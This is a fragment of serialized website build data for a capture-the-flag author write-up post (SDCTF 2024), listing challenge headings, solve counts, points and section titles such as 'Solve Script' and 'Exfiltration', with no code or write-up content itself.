Thank you for playing and see you next time! :D\u003C/p>",{"headings":159,"localImagePaths":232,"remoteImagePaths":233,"frontmatter":234,"imagePaths":237},[160,163,166,167,170,173,176,179,182,184,186,187,190,192,194,196,199,202,204,206,208,211,214,216,219,221,223,225,227,229],{"depth":34,"slug":161,"text":162},"misc","Misc",{"depth":38,"slug":164,"text":165},"blackjack-14-solves-162-pts","Blackjack (14 solves, 162 pts)",{"depth":86,"slug":39,"text":40},{"depth":86,"slug":168,"text":169},"challenge","Challenge",{"depth":86,"slug":171,"text":172},"notes","Notes",{"depth":86,"slug":174,"text":175},"solve-script","Solve Script",{"depth":86,"slug":177,"text":178},"references","References",{"depth":38,"slug":180,"text":181},"my-favorite-code-1-solve-500-pts","my-favorite-code (1 solve, 500 pts)",{"depth":86,"slug":183,"text":40},"description-1",{"depth":86,"slug":185,"text":169},"challenge-1",{"depth":86,"slug":42,"text":43},{"depth":86,"slug":188,"text":189},"inline-cache","Inline Cache?",{"depth":86,"slug":191,"text":175},"solve-script-1",{"depth":86,"slug":193,"text":172},"notes-1",{"depth":86,"slug":195,"text":178},"references-1",{"depth":34,"slug":197,"text":198},"web","Web",{"depth":38,"slug":200,"text":201},"fancy_text_viewer-4-solves-444-pts","fancy_text_viewer (4 solves, 444 pts)",{"depth":86,"slug":203,"text":40},"description-2",{"depth":86,"slug":205,"text":169},"challenge-2",{"depth":86,"slug":207,"text":43},"solution-1",{"depth":86,"slug":209,"text":210},"fuzzing","Fuzzing",{"depth":86,"slug":212,"text":213},"exfiltration","Exfiltration",{"depth":86,"slug":215,"text":178},"references-2",{"depth":38,"slug":217,"text":218},"snowfall-1-solve-500-pts","SNOWfall (1 solve, 500 pts)",{"depth":86,"slug":220,"text":40},"description-3",{"depth":86,"slug":222,"text":169},"challenge-3",{"depth":86,"slug":224,"text":172},"notes-2",{"depth":86,"slug":226,"text":172},"notes-3",{"depth":86,"slug":228,"text":178},"references-3",{"depth":38,"slug":230,"text":231},"conclusion","Conclusion",[150,115,151,152,153,154],[],{"title":137,"date":235,"tags":236},["Date","2024-05-15T02:00:00.000Z"],[60,21,140,141,142,143,144,145,22,146],[150,115,151,152,153,154],"SDCTF-2024-Author-Writeups/index.md"]